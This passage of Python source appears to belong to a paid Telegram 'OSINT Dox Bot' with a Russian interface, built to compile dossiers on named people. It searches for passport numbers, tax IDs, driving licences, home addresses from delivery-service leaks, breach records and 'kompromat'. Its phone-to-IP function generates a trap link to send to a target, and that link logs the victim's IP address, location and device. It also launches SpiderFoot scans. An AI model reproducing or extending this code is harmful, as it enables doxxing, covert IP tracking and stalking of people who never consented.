    for label, d in [("👨‍👩‍👧 Семья:", fam_d), ("💼 Работа:", work_d)]:
        results = d.get("organic_results", [])
        if results:
            m = f"<b>{label}</b>\n\n"
            for i, r in enumerate(results[:4], 1):
                m += f"<b>{i}. {r['title']}</b>\n{r.get('snippet','')}\n🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"
            await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def do_doc_search(msg: Message, query: str):
    d1, d2 = await asyncio.gather(
        google_search(f'"{query}" паспорт серия номер документы'),
        google_search(f'"{query}" гибдд права водительское удостоверение'),
    )
    all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in d1.get("organic_results", []))
    passports = list(set(re.findall(r"\b\d{4}\s*\d{6}\b", all_text)))
    inns      = list(set(re.findall(r"ИНН\s*:?\s*(\d{10,12})", all_text, re.I)))
    m = f"📄 <b>Документы: {query}</b>\n\n"
    if passports: m += "📋 Паспорта: " + ", ".join(f"<code>{p}</code>" for p in passports[:3]) + "\n"
    if inns:      m += "🔢 ИНН: " + ", ".join(f"<code>{i}</code>" for i in inns[:2]) + "\n"
    results = d1.get("organic_results", [])
    for i, r in enumerate(results[:4], 1):
        m += f"\n<b>{i}. {r['title']}</b>\n{r.get('snippet','')}\n🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>"
    await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    enc = query.replace(" ", "+")
    await msg.answer(
        f"🔎 <a href=\"https://egrul.nalog.ru/\">ЕГРЮЛ (ИНН)</a>  "
        f"<a href=\"https://xn--90adear.xn--p1ai/check/driver\">ГИБДД права</a>  "
        f"<a href=\"https://fssp.gov.ru/iss/ip/?name={enc}\">ФССП</a>  "
        f"<a href=\"https://leakcheck.io/?query={enc}\">LeakCheck</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_phone_to_ip(msg: Message, phone: str):
    clean = re.sub(r"[\s()\-−]", "", phone)
    leak  = await leakcheck_public(clean)
    if leak and leak.get("found", 0) > 0:
        lm = f"🔓 <b>LeakCheck: {leak['found']} утечек!</b>\n"
        if "ip" in (leak.get("fields") or []):
            lm += "🌍 <b>IP-адрес присутствует в скомпрометированных данных!</b>\n"
        if leak.get("fields"):
            lm += "Поля: " + ", ".join(leak["fields"]) + "\n"
        await msg.answer(lm, parse_mode=ParseMode.HTML)

    d = await google_search(f'"{clean}" IP-адрес адрес утечка база данных')
    all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in d.get("organic_results", []))
    found_ips = [ip for ip in set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", all_text)) if not ip.startswith(("0.","127.","192.168."))]
    if found_ips:
        m = "🌐 <b>IP-адреса рядом с номером:</b>\n\n" + "\n".join(f"• <code>{ip}</code>" for ip in found_ips[:5])
        await msg.answer(m, parse_mode=ParseMode.HTML)

    trap = await create_ip_trap()
    if trap:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO ip_traps (user_id, token, short_url, target_info) VALUES (?, ?, ?, ?)",
                (msg.from_user.id, trap["token"], trap["short_url"], clean)
            )
            await db.commit()
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=f"🔍 Проверить ловушку", callback_data=f"trap_check:{trap['token']}"))
        await msg.answer(
            f"🪤 <b>Ловушка создана!</b>\n\n"
            f"📎 Ссылка для цели:\n<code>{trap['short_url']}</code>\n\n"
            f"Когда цель нажмёт — получите IP.\n"
            f"Проверить: /check {trap['token']}",
            parse_mode=ParseMode.HTML, reply_markup=kb.as_markup()
        )


async def do_check_trap(msg: Message, token: str):
    requests = await check_trap(token)
    if not requests:
        return await msg.answer(f"🪤 <b>Ловушка: <code>{token}</code></b>\n\n⏳ Никто ещё не перешёл.", parse_mode=ParseMode.HTML)

    seen: set = set()
    full = f"🪤 <b>Ловушка сработала! {len(requests)} визит(а)</b>\n\n"
    for r in requests:
        ip = r.get("ip")
        if ip in seen:
            continue
        seen.add(ip)
        full += f"🌍 <b>IP: <code>{ip}</code></b>\n"
        full += f"📅 {r.get('created_at', '')[:16]}\n"
        geo = await http_get(f"http://ip-api.com/json/{ip}?fields=country,city,regionName,isp,mobile,proxy", timeout=5)
        if geo and geo.get("country"):
            full += f"📍 {geo['country']}, {geo.get('city','')}, {geo.get('regionName','')}\n"
            full += f"📡 {geo.get('isp','')}\n"
            if geo.get("mobile"): full += "📱 Мобильный\n"
            if geo.get("proxy"):  full += "⚠️ VPN/Прокси\n"
        ua = r.get("user_agent", "")
        if ua:
            dev = "📱 iPhone" if "iPhone" in ua else "📱 Android" if "Android" in ua else "💻 Windows" if "Windows" in ua else "💻 Mac" if "Mac" in ua else "🖥"
            full += f"📲 {dev}\n"
        full += "\n"

    await msg.answer(full, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def do_housing_search(msg: Message, query: str):
    await msg.answer(f"🏘 <b>Поиск жилья: {query}</b>\nАнализирую 6 источников...", parse_mode=ParseMode.HTML)
    d1, d2, d3, d4 = await asyncio.gather(
        google_search(f'"{query}" ("яндекс.еда" OR "delivery club") адрес доставки'),
        google_search(f'"{query}" (сдэк OR boxberry OR "почта России") адрес получател'),
        google_search(f'"{query}" site:rosreestr.gov.ru OR "кадастровый номер" OR "объект недвижимости"'),
        google_search(f'"{query}" site:avito.ru OR site:cian.ru (квартира OR дом)'),
    )
    for label, d in [("📦 Утечки доставок:", d1), ("🚚 СДЭК/Boxberry:", d2), ("🏛 Росреестр:", d3), ("🏠 Авито/Циан:", d4)]:
        results = d.get("organic_results", [])
        if results:
            all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in results)
            c = extract_contacts(all_text)
            m = f"<b>{label}</b>\n"
            if c["addresses"]: m += "📍 " + " | ".join(c["addresses"][:2]) + "\n\n"
            for r in results[:3]:
                m += f"• <a href=\"{r['link']}\">{r['title']}</a>\n{r.get('snippet','')[:80]}\n\n"
            await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    enc = query.replace(" ", "+")
    await msg.answer(
        f"🔎 <a href=\"https://rosreestr.gov.ru/wps/portal/online_check\">Росреестр</a>  "
        f"<a href=\"https://fssp.gov.ru/iss/ip/?name={enc}\">ФССП</a>  "
        f"<a href=\"https://www.avito.ru/?q={enc}\">Авито</a>  "
        f"<a href=\"https://sudact.ru/search/?query={enc}\">Суды</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_deep_leaks(msg: Message, query: str):
    await msg.answer(f"🔓 <b>Утечки: {query}</b>\nПроверяю 9 сервисов...", parse_mode=ParseMode.HTML)
    leak = await leakcheck_public(query)
    if leak and leak.get("found", 0) > 0:
        m = f"🔓 <b>LeakCheck: найдено в {leak['found']} утечках!</b>\n"
        if leak.get("fields"): m += "Поля: " + ", ".join(leak["fields"][:8]) + "\n"
        if leak.get("sources"): m += "Источники: " + ", ".join(leak["sources"][:5]) + "\n"
        await msg.answer(m, parse_mode=ParseMode.HTML)

    searches = [
        ("🔵 ВКонтакте:",         f'"{query}" site:vk.com'),
        ("🟡 Яндекс (Еда/Такси):", f'"{query}" ("яндекс.еда" OR "яндекс.такси" OR "яндекс.маркет")'),
        ("📧 Mail.ru / ОК:",        f'"{query}" (site:mail.ru OR site:ok.ru OR "@mail.ru")'),
        ("🏦 Банки:",               f'"{query}" (сбербанк OR тинькофф OR "альфа-банк") карта OR счёт'),
        ("🛒 Маркетплейсы:",        f'"{query}" (wildberries OR ozon OR lamoda OR сдэк) заказ'),
        ("💼 HH.ru / LinkedIn:",    f'"{query}" site:hh.ru OR site:linkedin.com OR резюме должность'),
        ("🚗 ГИБДД:",               f'"{query}" гибдд OR "водительское" OR "транспортное средство"'),
    ]
    for label, q in searches:
        d = await google_search(q)
        results = d.get("organic_results", [])
        if results:
            m = f"<b>{label}</b>\n\n"
            for r in results[:3]:
                m += f"• <a href=\"{r['link']}\">{r['title']}</a>\n{r.get('snippet','')[:80]}\n\n"
            await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            await asyncio.sleep(0.3)

    enc = query.replace(" ", "+").replace("@", "%40")
    await msg.answer(
        f"🔎 <a href=\"https://leakcheck.io/?query={enc}\">LeakCheck</a>  "
        f"<a href=\"https://haveibeenpwned.com/account/{enc}\">HIBP</a>  "
        f"<a href=\"https://dehashed.com/search?query={enc}\">Dehashed</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_reverse_image(msg: Message, image_url: str):
    r = await http_get(
        "https://www.searchapi.io/api/v1/search",
        params={"engine": "google_lens", "url": image_url, "api_key": SEARCHAPI_KEY},
        timeout=30
    )
    matches = r.get("visual_matches", []) if r else []
    kg = r.get("knowledge_graph") if r else None

    if kg and kg.get("title"):
        await msg.answer(render_kg(kg) or kg["title"], parse_mode=ParseMode.HTML)

    if not matches:
        await msg.answer(
            "🔍 Google Lens не нашёл точных совпадений.\n\n"
            f"<a href=\"https://yandex.ru/images/search?rpt=imageview&url={image_url}\">🔍 Яндекс.Картинки</a>  "
            f"<a href=\"https://www.tineye.com/search?url={image_url}\">🔍 TinEye</a>",
            parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
        return

    m = f"📷 <b>Результаты обратного поиска: {len(matches)}</b>\n\n"
    for i, match in enumerate(matches[:6], 1):
        m += f"<b>{i}. {match.get('title', '—')}</b>\n"
        if match.get("source"): m += f"🌐 {match['source']}\n"
        m += f"🔗 <a href=\"{match.get('link', '#')}\">{match.get('domain', '')}</a>\n\n"
    await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    sent = 0
    for match in matches[:4]:
        img = match.get("image", {}).get("link") or match.get("thumbnail")
        if img and not str(img).startswith("data:") and await send_photo_safe(msg, match.get("title", ""), img):
            sent += 1


async def do_spiderfoot(msg: Message, target: str):
    if not Path("/tmp/spiderfoot/sf.py").exists():
        return await msg.answer("❌ SpiderFoot не установлен. Клонируйте: git clone https://github.com/smicallef/spiderfoot /tmp/spiderfoot && pip install -r /tmp/spiderfoot/requirements.txt")

    async with aiohttp.ClientSession() as s:
        try:
            await s.get("http://127.0.0.1:5001/ping", timeout=aiohttp.ClientTimeout(total=2))
        except Exception:
            proc = await asyncio.create_subprocess_exec(
                "python3", "/tmp/spiderfoot/sf.py", "-l", "127.0.0.1:5001", "-d",
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
            )
            await asyncio.sleep(8)

    sf_msg = await msg.answer(f"🕷 <b>SpiderFoot: {target}</b>\n\n⏳ Запускаю сканирование...", parse_mode=ParseMode.HTML)

    try:
        async with aiohttp.ClientSession() as s:
            form = aiohttp.FormData()
            form.add_field("scanname", f"bot_{int(time.time())}")
            form.add_field("scantarget", target)
            if RE_IP.match(target):    form.add_field("typelist", "IP_ADDRESS")
            elif RE_EMAIL.match(target): form.add_field("typelist", "EMAILADDR")
            elif RE_DOMAIN.match(target): form.add_field("typelist", "INTERNET_NAME")
            else:                       form.add_field("typelist", "USERNAME")
            form.add_field("modulelist", "sfp_whois,sfp_dnsresolve,sfp_email,sfp_accounts,sfp_github,sfp_bingsearch,sfp_company")
            form.add_field("usecase", "all")
            await s.post("http://127.0.0.1:5001/startscan", data=form, allow_redirects=True)
            await asyncio.sleep(2)
            async with s.get("http://127.0.0.1:5001/scanlist") as r:
                scan_list = await r.json()
            scan_id = scan_list[0][0] if scan_list else None
            if not scan_id:
                return await msg.answer("❌ Скан не создан.")

            for _ in range(18):
                await asyncio.sleep(5)
                async with s.get(f"http://127.0.0.1:5001/scanstatus/{scan_id}") as r:
                    st = await r.json()
                status = st[5] if len(st) > 5 else st[-1]
                count  = st[7] if len(st) > 7 else 0
                await bot.edit_message_text(
                    f"🕷 <b>SpiderFoot: {target}</b>\n🔄 {status} · Найдено: <b>{count}</b>",
                    chat_id=msg.chat.id, message_id=sf_msg.message_id, parse_mode=ParseMode.HTML
                )
                if status in ("FINISHED", "ERROR", "ABORTED"):
                    break

            async with s.get(f"http://127.0.0.1:5001/scaneventresults/{scan_id}/ALL") as r:
                results = await r.json()

        await bot.edit_message_text(
            f"🕷 <b>SpiderFoot: {target}</b>\n✅ Завершено · Объектов: <b>{len(results)}</b>",
            chat_id=msg.chat.id, message_id=sf_msg.message_id, parse_mode=ParseMode.HTML
        )

        IMPORTANT = {"ACCOUNT_EXTERNAL_OWNED", "EMAILADDR", "PHONE_NUMBER", "PHYSICAL_ADDRESS",
                     "HUMAN_NAME", "COMPANY_NAME", "IP_ADDRESS", "INTERNET_NAME", "PGP_KEY",
                     "LEAKSITE_CONTENT", "DARKWEB_MENTION", "VULNERABILITY_CVE_HIGH", "TCP_PORT_OPEN"}
        groups: dict = {}
        for r in results:
            t = r[10] if len(r) > 10 else str(r[-1])
            if t in IMPORTANT:
                groups.setdefault(t, set()).add(str(r[1])[:150])

        if groups:
            chunk = f"🕷 <b>SpiderFoot результаты: {target}</b>\n\n"
            for t, vals in groups.items():
                items = "\n".join(f"  • {v}" for v in list(vals)[:6])
                part  = f"<b>{t.replace('_',' ')}:</b>\n{items}\n\n"
                if len(chunk) + len(part) > 4000:
                    await msg.answer(chunk, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                    chunk = ""
                chunk += part
            if chunk.strip():
                await msg.answer(chunk, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        else:
            types: dict = {}
            for r in results:
                t = r[10] if len(r) > 10 else str(r[-1])
                types[t] = types.get(t, 0) + 1
            stat = "\n".join(f"▪️ {t}: {c}" for t, c in sorted(types.items(), key=lambda x: -x[1])[:15])
            await msg.answer(f"📊 <b>Статистика: {len(results)} объектов</b>\n\n{stat}", parse_mode=ParseMode.HTML)

    except Exception as e:
        await msg.answer(f"❌ Ошибка SpiderFoot: {e}")


async def do_full_dossier(msg: Message, query: str):
    await msg.answer(
        f"📋 <b>Полное досье: {query}</b>\n\n"
        "1️⃣ ФИО и биография\n2️⃣ Фотографии\n3️⃣ Адрес\n4️⃣ Компромат",
        parse_mode=ParseMode.HTML
    )
    await msg.answer("━━━ 1️⃣  ФИО И БИОГРАФИЯ ━━━")
    await do_person_search(msg, query)
    await msg.answer("━━━ 2️⃣  ФОТОГРАФИИ ━━━")
    await do_photo_search(msg, query)
    await msg.answer("━━━ 3️⃣  АДРЕС ━━━")
    await do_address_search(msg, query)
    await msg.answer("━━━ 4️⃣  КОМПРОМАТ ━━━")
    await do_kompromat(msg, query)
    await msg.answer("✅ <b>Досье собрано.</b>", parse_mode=ParseMode.HTML, reply_markup=main_menu())


# ─── Запуск ────────────────────────────────────────────────────────────────────
async def main():
    await init_db()
    print("🚀 Запуск OSINT Dox Bot (Python)...")
    print(f"✅ Бот @{(await bot.get_me()).username} запущен")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query", "pre_checkout_query"])


if __name__ == "__main__":
    asyncio.run(main())
